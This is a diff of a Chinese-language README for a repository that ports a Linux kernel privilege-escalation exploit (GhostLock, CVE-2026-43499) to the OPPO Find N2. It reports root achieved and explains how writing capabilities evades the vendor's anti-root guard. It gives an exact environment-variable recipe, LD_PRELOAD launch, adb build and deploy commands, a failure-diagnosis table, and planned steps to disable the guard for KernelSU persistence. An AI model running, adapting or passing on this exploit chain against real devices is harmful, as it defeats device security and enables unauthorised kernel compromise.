@@ -1,181 +1,125 @@
-# README.md
-
 # oppo-ghostlock
 
 GhostLock CVE-2026-43499 — OPPO Find N2 Linux 内核提权研究
 
-[![Version](https://img.shields.io/badge/version-1.0--research-blue)](https://github.com/pubglite55/oppo-ghostlock)
+[![Version](https://img.shields.io/badge/version-2.0--root%20achieved-success)](https://github.com/pubglite55/oppo-ghostlock)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Build](https://img.shields.io/badge/build-NDK%20r29-orange)]()
 
 ## 项目概述
 
-### 项目背景
+GhostLock (CVE-2026-43499) 是一个影响 Linux 2.6.39 至 7.1-rc1 的内核栈 UAF 漏洞，通过 `FUTEX_CMP_REQUEUE_PI` 竞态条件触发。本项目将其适配到 **OPPO Find N2 (SM8475 / PGU110, ARM64, kernel 5.10.236)**。
 
-GhostLock (CVE-2026-43499) 是一个影响 Linux 2.6.39 至 7.1-rc1 的内核栈 UAF 漏洞，通过 `FUTEX_CMP_REQUEUE_PI` 竞态条件触发。本项目旨在将 NebuSec/CyberMeowfia 的 x86_64 exploit 适配到 OPPO Find N2 (ARM64, kernel 5.10.236)，实现无 root 环境下的内核提权。
+## ★ 当前状态:**已拿到真 root(3/3 复现,设备全程不卡死、不重启)**
 
-### 核心痛点
+```
+[+] mt47: ROOT-SEEN … CapEff=ffffff8a368280c0 poll=17     <- caps 写入落地
+[*] mt47: after setres uid=0 euid=0 gid=0 egid=0          <- ★ 真 uid=0 ★
+[+] mt47: ksud loader launched (uid=0) pid=20644
+设备: enforce=Permissive  uptime 连续  framework OK       <- 无崩溃
+```
 
-- GhostLock exploit 原始实现基于 x86_64 架构，无法直接在 ARM64 设备上运行
-- OPPO Find N2 内核安全配置极其严格，所有已知利用路径均被阻塞
-- 缺少 root 权限和 user namespaces，无法触发需要特权的漏洞
+三轮独立运行(N2 / P2 / K3)全部命中,证据见 `docs/evidence-root-*.log`。
 
-### 适用场景
+### 关键机制:用 caps 写入绕开厂商反 root 守护
 
-- Linux 内核安全研究与漏洞验证
-- ARM64 架构 exploit 适配参考
-- GhostLock (CVE-2026-43499) 漏洞利用链分析
-- Android 设备内核安全评估
+OPPO 的 `oplus_security_guard.ko` 只比较 `uid/euid/gid/egid` 的**下降沿**,**不读 capabilities**;
+而 `setresuid`(syscall 146)在其**豁免表**内。因此:
 
-### 当前项目状态
+1. 只写 `cred->cap_effective`(偏移 `0x38`),**绝不触碰 uid/euid/gid/egid** ⇒ 守护看不见;
+2. 拿到 `CAP_SETUID|CAP_SETGID` 后走 `setresuid(0,0,0)` ⇒ uid 下降沿落在豁免区 ⇒ 不上报。
 
-**迭代中** — 多个利用阶段已验证通过，核心阻塞点已明确（rb_erase 时序约束）。Poll Stamping via MCAST_JOIN_SOURCE_GROUP 经 IDA 精确分析和 5 轮测试，确认在 5.10 内核上存在不可逾越的时序约束。
+### 可复现配方(六开关,缺一必败)
 
-## 核心特性
+```bash
+export PSELECT_SKIP_WARMUP=1 PSELECT_SLIDE_TRIGGER=1
+export PSELECT_CRED=1            # 进入凭证链
+export PSELECT_PERF_CRED=1       # ★ 决定性开关:让 perf 泄露提取 cred_addr
+export PSELECT_CAPS_MODE=1       # 写 cap_effective(而非 uid)
+export PSELECT_RETRY=1           # 禁止 8 轮连打(连打 = 悬垂毒叠加 = 黑屏)
+export PSELECT_WINDOW_SECONDS=60 # 窗口不足会 mid-burst 中止
+export PSELECT_TREE_PC=ffffff802aa793c0 PSELECT_TREE_RIGHT=SPRAY PSELECT_TRIGGER_SHOTS=16
+export LD_PRELOAD=/data/local/tmp/preload29.so
+cd /data/local/tmp && timeout 420 /system/bin/ls /dev/null
+```
 
-- **Firefox CVE-2026-10702 exploit** — SpiderMonkey type confusion → AAW，已在设备上验证
-- **KernelSnitch mm_struct 泄漏** — 通过 futex hash timing 泄漏内核地址，7-bug 修复已验证
-- **GhostLock FUTEX 触发** — `FUTEX_CMP_REQUEUE_PI` ret=0，触发成功
-- **sk_buff 堆喷射** — 4/4 send 成功，可用于堆布局控制
-- **PR #13 KASLR bypass** — 绕过 slide，直接计算 kaslr_base
-- **IDA Pro 全量偏移验证** — 70+ 内核偏移通过 output.elf 验证
-- **Poll Stamping 分析** — MCAST_JOIN_SOURCE_GROUP 栈帧 offset 0x108 (IDA 验证)，rb_erase 时序约束确认
+**★ 交付时不要传 `PSELECT_ROOT_EXIT`** —— 持毒进程应 park 而非 `_exit`(`_exit` 触发 mm teardown 会
+panic,这是本机早期反复黑屏的根因)。
 
-## 技术栈全景
+**两条前置条件**:① SELinux **Permissive**(E5 命中,否则 `perf_event_open` 返回 EACCES);
+② **MemFree ≥ 2GB**(543 子进程喷砂需要匿名内存;开机头 1~2 分钟 force-stop + kill-all 最有效)。
 
-### 运行时层
-- Android 16 (BP2A.250605.015)
-- Linux kernel 5.10.236-android12-9-o-g74d132f4467a
-- OPPO Find N2 (SM8475/CPH2413)
+### 失败症状快查
 
-### 核心机制层
-- GhostLock (CVE-2026-43499) rtmutex stack UAF
-- FUTEX_CMP_REQUEUE_PI 竞态触发
-- KernelSnitch futex hash timing 泄漏
-- pselect fd_set 栈覆盖 / 堆喷射
+| 日志 | 病因 | 修法 |
+|---|---|---|
+| `mt40: no cred_cand from perf - need PSELECT_PERF_CRED` | 缺开关 | 加 `PSELECT_PERF_CRED=1` |
+| `perf_event_open failed errno=13` | 仍 Enforcing | 先打 E5 |
+| `mt47: alive poll=…` 一直涨、`CapEff=0` | `cred_addr=0` 或写入未落地 | 查上面两条 |
+| `mt28m: cred write attempt 1/8` | 没传 `PSELECT_RETRY=1` | 传 1 |
+| `CANNOT LINK EXECUTABLE … not found` | 重启后 `/data/local/tmp` 被清 | 重推 + 校验 sha |
+| `window closed mid-burst` | 窗口太短 | 60s |
 
-### 工具链层
+## 未完成:KernelSU / 持久化
+
+Root 是**瞬时的**(持毒进程 park,不对外提供 su)。KernelSU 装载的三个已定位障碍:
+
+1. **`ksud late-load` 以 uid=2000 运行会静默返回 rc=0 却不加载** ⇒ 必须由真 root 执行;
+2. **OPPO 守护主动拦截 KernelSU 管理器**:dmesg 实证 `libksud.so result execve_block`、
+   `curr_name@@kernelsu_zygote` ⇒ 装载前需用 root 临时停用该守护;
+3. exploit 的 root payload 里 `system("sh ksu_go.sh &")` **未真正执行**(需改为显式 `fork`+`execve`)。
+
+`exploit-v29/tools/ksu_go.sh` 已备好(复原自上游成功流程)。
+
+## 技术栈
+
+- Android 16 / Linux 5.10.236-android12-9-o-g74d132f4467a / OPPO Find N2 (SM8475)
+- GhostLock (CVE-2026-43499) rtmutex stack UAF + `FUTEX_CMP_REQUEUE_PI`
+- KernelSnitch mm_struct 泄漏 + perf_event_open 凭证泄露
 - Android NDK r29 (`aarch64-linux-android35-clang`)
-- IDA Pro (output.elf.i64, MCP port 13337)
-- pahole (结构体偏移验证)
-- adb (设备调试)
-
-### 依赖库层
-- NebuSec/CyberMeowfia exploit 框架
-- Firefox 151 (CVE-2026-10702)
 
 ## 快速开始
 
-### 环境要求
-
-- macOS / Linux (需要 Android NDK)
-- Android NDK r29
-- OPPO Find N2 设备 (serial=84cb96e2)
-- Firefox 151 (用于 Stage 1)
-
-### 安装部署
-
 ```bash
-# 1. 克隆仓库
-git clone https://github.com/pubglite55/oppo-ghostlock.git
-cd oppo-ghostlock
+# 1) 编译
+cd exploit-v29 && bash ../build_v29.sh         # 产物: build/oppo-find_n2/bin/preload.so
 
-# 2. 设置 NDK 路径
-export NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK
+# 2) 部署(每次设备重启后都要重推,/data/local/tmp 会被清)
+adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/preload29.so
+adb shell chmod 755 /data/local/tmp/preload29.so
+adb shell sha256sum /data/local/tmp/preload29.so   # 与本机 sha 核对
 
-# 3. 编译 exploit
-cd exploit/
-make clean && make NDK=$NDK
+# 3) 腾内存(抢在应用自启前)
+for p in com.tencent.mm com.eg.android.AlipayGphone com.ss.android.ugc.aweme com.phoenix.read; do
+  adb shell am force-stop $p; done
+adb shell am kill-all
+adb shell grep MemFree /proc/meminfo         # 目标 >= 2GB
 
-# 4. 推送到设备
-adb push preload.so /data/local/tmp/
+# 4) 打(配方见上;先 E5 拿 Permissive,再 caps 链拿 root)
 ```
 
-### 启动运行
-
-```bash
-# 运行 exploit
-adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1
-
-# 验证成功: 输出 "preload starting pid=..." 表示加载成功
-```
-
-### 最简使用示例
-
-```bash
-# 编译
-cd exploit/ && make clean && make NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK
-
-# 部署
-adb push preload.so /data/local/tmp/
-
-# 运行
-adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1
-```
-
-## 仓库目录结构
+## 目录结构
 
 ```
 oppo-ghostlock/
-├── exploit/                          # 核心 exploit 代码
-│   ├── src/
-│   │   ├── main.c                    # 主入口，GhostLock 触发
-│   │   ├── fops.c                    # pselect fake lock route + kernel base leak
-│   │   ├── pipe.c                    # pipe 物理读写
-│   │   ├── root.c                    # root 提权
-│   │   ├── slide.c                   # KASLR bypass (已弃用)
-│   │   ├── util.c                    # 工具函数 (text_addr, configfs)
-│   │   ├── kernelsnitch/             # KernelSnitch mm_struct 泄漏
-│   │   │   ├── kernelsnitch.h        # KernelSnitch 头文件
-│   │   │   └── futex_hash.h          # futex hash 修复
-│   │   └── targets/
-│   │       └── oppo-find_n2/
-│   │           └── target.h          # OPPO Find N2 偏移量定义
-│   ├── Makefile                      # 编译脚本
-│   └── out/                          # 编译输出
-├── docs/                             # 文档目录
-│   ├── architecture.md               # 架构设计文档
-│   ├── setup.md                      # 环境搭建文档
-│   ├── best-practice.md              # 开发最佳实践
-│   ├── knowledge-notes.md            # 技术知识沉淀
-│   ├── poll-stamping-mcast-analysis.md  # Poll Stamping MCAST_JOIN_SOURCE_GROUP 完整分析
-│   └── poll-stamping-bypass-plan.md     # Poll Stamping 绕过方案与时序分析
-├── test-programs/                    # 测试程序
-├── analysis-scripts/                 # 分析脚本
-├── AGENTS.md                         # 智能体说明
-├── TESTED_METHODS.md                 # 所有测试方法汇总
-├── TROUBLESHOOTING.md                # 问题排查手册
-├── FAQ.md                            # 常见问题
-├── CHANGELOG.md                      # 版本更新日志
-├── handoff.md                        # 项目交接文档
-├── 问题描述.md                        # 项目问题梳理
-└── README.md                         # 本文件
+├── exploit-v29/                      # 核心 exploit(matisse 移植,GPL-3.0 见 NOTICE.md)
+│   ├── src/ main.c slide.c util.c …  # mt90 caps 分支 / mt92 root exit / 路线实现
+│   ├── src/targets/oppo-find_n2/     # 本机偏移定义
+│   └── tools/ksu_go.sh               # KernelSU 装载脚本
+├── docs/ matisse-port.md             # §0–§13.5 完整技术记录
+├── docs/evidence-root-*.log          # ★ 三次成功 root 的原始日志
+├── docs/reference-matisse-win-*.md   # 上游同源项目成功记录
+└── README.md
 ```
 
-## 文档导航
+## 致谢
 
-- [架构设计文档](docs/architecture.md) — exploit chain 设计与实现
-- [环境搭建文档](docs/setup.md) — 开发环境配置与部署
-- [开发最佳实践](docs/best-practice.md) — 代码规范与核心原理
-- [技术知识沉淀](docs/knowledge-notes.md) — 内核结构体与漏洞机制
-- [Poll Stamping 分析](docs/poll-stamping-mcast-analysis.md) — MCAST_JOIN_SOURCE_GROUP IDA 分析、offset 计算、测试结果
-- [Poll Stamping 绕过方案](docs/poll-stamping-bypass-plan.md) — rb_erase 时序问题、绕过方向
-- [问题排查手册](TROUBLESHOOTING.md) — 全量问题排查指南
-- [常见问题](FAQ.md) — 高频问题速查
-- [版本更新日志](CHANGELOG.md) — 项目迭代记录
-- [项目交接文档](handoff.md) — 标准交接文档
-- [智能体说明](AGENTS.md) — 智能体指令文档
-- [所有测试方法](TESTED_METHODS.md) — 56+ 方法完整记录
-- [项目问题梳理](问题描述.md) — 问题清单与状态
+- [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) — GhostLock exploit 原始实现
+- [NebuSec IonStack Writeup](https://nebusec.ai/research/ionstack-part-2/) — 技术分析
+- [Dere3046/ElevateMe](https://github.com/Dere3046/ElevateMe) — rb_erase cred 覆写机制
+- [diyiqiuye/CVE-2025-21479-FX5P](https://github.com/diyiqiuye/CVE-2025-21479-FX5P) — 偏移工具与 profile 方法论
+- [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) — cph2521(同 SoC)偏移交叉验证
 
 ## 开源协议
 
-本项目采用 MIT 协议。
-
-## 致谢/参考
-
-- [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) — GhostLock exploit 原始实现
-- [NebuSec IonStack Writeup](https://nebusec.ai/research/ionstack-part-2/) — GhostLock 技术分析
-- [Dere3046/ElevateMe](https://github.com/Dere3046/ElevateMe) — rb_erase cred 覆写机制
-- 52pojie OnePlus 13T 适配帖 — 偏移分类方法论
-- brszzz.github.io 技术博客 — 内核符号还原方法
+MIT(子目录 `exploit-v29/` 源自 GPL-3.0 的 matisse,该子树维持 GPL-3.0,见 `NOTICE.md`)
